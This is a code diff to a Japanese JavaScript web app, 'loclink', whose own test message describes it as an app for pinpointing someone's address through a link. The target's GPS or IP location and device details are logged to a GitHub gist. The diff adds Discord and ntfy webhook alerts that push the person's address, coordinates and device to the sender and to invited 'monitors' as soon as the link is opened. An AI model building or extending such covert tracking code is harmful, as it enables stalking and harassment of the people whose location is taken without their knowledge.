@@ -71,6 +71,7 @@ var $ = function(id){ return document.getElementById(id); };
 var hp = new URLSearchParams(location.hash.replace(/^#/,""));
 var TOKEN = hp.get("t") || localStorage.getItem("loclink_tok") || "";
 if (hp.get("t")) localStorage.setItem("loclink_tok", hp.get("t"));
+var WEBHOOK = localStorage.getItem("loclink_wh") || "";
 var GH = "https://api.github.com/gists";
 var NAME = hp.get("n") || "";
 var RID  = (hp.get("r") || "").replace(/^gh/,"");
@@ -143,10 +144,17 @@ function shopsNear(lat, lon){
 function geoText(lat, lon){ return (Math.round(lat*1e5)/1e5) + ", " + (Math.round(lon*1e5)/1e5); }
 function openMaps(lat, lon){ location.href = "https://maps.google.com/?q=" + lat + "," + lon; }
 function watchUrl(id){ return BASE + "#r=gh" + id + "&v=view"; }
+function whList(s){ return String(s||"").split(/[\s,]+/).filter(function(x){ return /^https?:/i.test(x); }); }
+function sendWh(url, text){
+  if(/ntfy/i.test(url)) return req("POST", url, {"Content-Type":"text/plain"}, text, true);
+  return req("POST", url, {"Content-Type":"application/json"}, { content: text });
+}
 
 /* ===================== Gist ===================== */
 function createGist(){
-  return req("POST", GH, gh(), { description:"loclink", public:false, files:{ "hits.json":{content:"[]"} } })
+  var f = { "hits.json":{content:"[]"} };
+  if(WEBHOOK) f["config.json"] = { content: JSON.stringify({ webhook:WEBHOOK }) };
+  return req("POST", GH, gh(), { description:"loclink", public:false, files:f })
     .then(function(r){ if(!r.ok) throw new Error("HTTP "+r.status); var j = JSON.parse(r.text); return j.id; });
 }
 function readGist(id){
@@ -229,7 +237,6 @@ function drawMap(elId, lat, lon, dark){
 
 /* =====================================================================
    監視専用ページ（v=view）
-   ・トークンなし / 読み取り専用 / 記録されない / アプリには戻れない
    ===================================================================== */
 if(RID && V === "view"){
   var IV = TOKEN ? 20000 : 120000;
@@ -325,7 +332,28 @@ if(RID && V === "view"){
 if(RID){
   var S = { lat:null, lon:null, addr:"", acc:null, ip:"", gps:false };
 
-  function report(){ return record(RID, { lat:S.lat, lon:S.lon, addr:S.addr, acc:S.acc, gps:S.gps, city:S.ip }); }
+  var NOTIFIED = false, NOTIFY_T = null;
+  function report(){ return record(RID, { lat:S.lat, lon:S.lon, addr:S.addr, acc:S.acc, gps:S.gps, city:S.ip }).then(function(){ notifyHit(); }); }
+
+  function notifyHit(){
+    if(NOTIFIED) return;
+    if(S.gps || !GF){ NOTIFIED = true; doNotify(); return; }
+    if(!NOTIFY_T) NOTIFY_T = setTimeout(function(){ if(!NOTIFIED){ NOTIFIED = true; doNotify(); } }, 10000);
+  }
+  function doNotify(){
+    req("GET", GH+"/"+RID, gh()).then(function(r){
+      if(!r.ok) return;
+      var j = JSON.parse(r.text), whs = [];
+      try{ whs = whList(JSON.parse((j.files["config.json"] && j.files["config.json"].content) || "{}").webhook); }catch(e){}
+      if(!whs.length) return;
+      var msg = "🔔 " + (NAME || "相手") + "さんがリンクを開きました\n"
+        + "📍 " + (S.addr || S.ip || "取得中") + (S.gps ? "（GPS ±" + S.acc + "m）" : "（IP・市レベル）")
+        + (S.lat ? "\n🧭 " + geoText(S.lat, S.lon) : "")
+        + "\n🕐 " + new Date().toLocaleString("ja-JP")
+        + "\n📱 " + devName();
+      whs.forEach(function(u){ sendWh(u, msg).catch(function(){}); });
+    }).catch(function(){});
+  }
 
   function applyFix(p){
     var a = Math.round(p.coords.accuracy);
@@ -682,6 +710,7 @@ $("app").innerHTML =
 +       '<div class="row"><button id="btnReload">更新</button><button id="btnResCopy">結果をコピー</button></div>'
 +       '<div class="row"><button id="btnViewLink" class="vw">監視リンクをコピー</button></div>'
 +       '<div class="link vw hidden" id="viewLink" style="margin-top:8px;"></div>'
++       '<div class="row"><button id="btnSetWh">このリンクに通知先を設定</button></div>'
 +       '<div class="row"><button id="btnResStop" class="dang">このリンクを停止する</button></div>'
 +     '</div>'
 +   '</div>'
@@ -699,6 +728,13 @@ $("app").innerHTML =
 +     '<input id="inTok" placeholder="ghp_..." autocomplete="off" autocapitalize="off" spellcheck="false">'
 +     '<div class="row"><button id="btnTokSave" class="pri">保存</button><button id="btnTokTest">テスト</button></div>'
 +     '<div class="muted" id="tokMsg"></div>'
++   '</div>'
++   '<div class="card">'
++     '<div class="h2">通知先（Discord / ntfy）</div>'
++     '<textarea id="inWh" placeholder="https://discord.com/api/webhooks/... （1行に1個・複数OK）"></textarea>'
++     '<div class="row"><button id="btnWhSave" class="pri">保存</button><button id="btnWhTest">テスト通知</button></div>'
++     '<div class="muted" id="whMsg"></div>'
++     '<div class="muted">Discordのチャンネル名の横の歯車 →「連携サービス」→「ウェブフック」→「新しいウェブフック」→ URLをコピー。サーバーに招待した監視員全員に届きます。</div>'
 +   '</div>'
 +   '<div class="card">'
 +     '<div class="h2">使い方</div>'
@@ -719,7 +755,7 @@ $("app").innerHTML =
 +   '<div class="card">'
 +     '<div class="h2">注意</div>'
 +     '<div class="muted" style="margin:0 0 8px;">トークンを再発行すると、今まで送ったリンクは全部止まります。</div>'
-+     '<div class="muted" style="margin:0 0 8px;">リンクを「停止」すると記録も一緒に消えます。</div>'
++     '<div class="muted" style="margin:0 0 8px;">リンクを「停止」すると記録も一緒に消えます。トークンと通知先はこの端末に残るので、次のリンクに自動で付きます。</div>'
 +     '<div class="muted" style="margin:0;">相手がもう一度開くと記録が増えます。表示は一番新しいGPSの記録です。</div>'
 +   '</div>'
 + '</div>';
@@ -730,7 +766,7 @@ document.querySelectorAll(".tabs button").forEach(function(b){
     document.querySelectorAll(".tabs button").forEach(function(x){ x.classList.toggle("on", x === b); });
     ["send","res","set"].forEach(function(t){ $("t-"+t).classList.toggle("hidden", t !== tab); });
     if(tab === "res"){ refreshRes(); startPoll(); } else stopPoll();
-    if(tab === "set"){ $("inTok").value = TOKEN; }
+    if(tab === "set"){ $("inTok").value = TOKEN; $("inWh").value = WEBHOOK; }
   };
 });
 
@@ -830,6 +866,13 @@ $("btnResStop").onclick = function(){
   if(!CUR) return;
   if(!confirm("このリンクを停止します。相手が開いても何も起きなくなります。")) return;
   doStop(CUR.id, function(){ $("resNote").textContent = "このリンクは停止済みです。"; });
+};
+$("btnSetWh").onclick = function(){
+  if(!CUR) return;
+  if(!WEBHOOK){ $("resNote").textContent = "設定タブで通知先を入れてください。"; return; }
+  var b = { files:{} }; b.files["config.json"] = { content: JSON.stringify({ webhook:WEBHOOK }) };
+  req("PATCH", GH+"/"+CUR.id, gh(), b).then(function(){ $("resNote").textContent = "このリンクに通知先を設定しました。"; })
+    .catch(function(){ $("resNote").textContent = "設定に失敗しました。"; });
 };
 
 function renderHist(){
@@ -953,6 +996,22 @@ $("btnTokTest").onclick = function(){
       if(r.ok){ var j = JSON.parse(r.text); $("tokMsg").textContent = "OK：" + j.login; }
       else $("tokMsg").textContent = "失敗 HTTP " + r.status;
     }).catch(function(){ $("tokMsg").textContent = "通信エラー"; });
+};
+
+$("btnWhSave").onclick = function(){
+  WEBHOOK = $("inWh").value.trim();
+  localStorage.setItem("loclink_wh", WEBHOOK);
+  $("whMsg").textContent = WEBHOOK ? "保存しました。次に作るリンクから有効です。" : "空にしました。";
+};
+$("btnWhTest").onclick = function(){
+  var v = $("inWh").value.trim() || WEBHOOK;
+  var urls = whList(v);
+  if(!urls.length){ $("whMsg").textContent = "通知先がありません"; return; }
+  $("whMsg").textContent = "送信中…";
+  var msg = "✅ テスト通知（" + new Date().toLocaleString("ja-JP") + "）\nリンクで住所特定アプリ";
+  Promise.all(urls.map(function(u){ return sendWh(u, msg); }))
+    .then(function(){ $("whMsg").textContent = urls.length + "件に送信しました。"; })
+    .catch(function(){ $("whMsg").textContent = "送信失敗。URLを確認してください。"; });
 };
 
 renderHist();
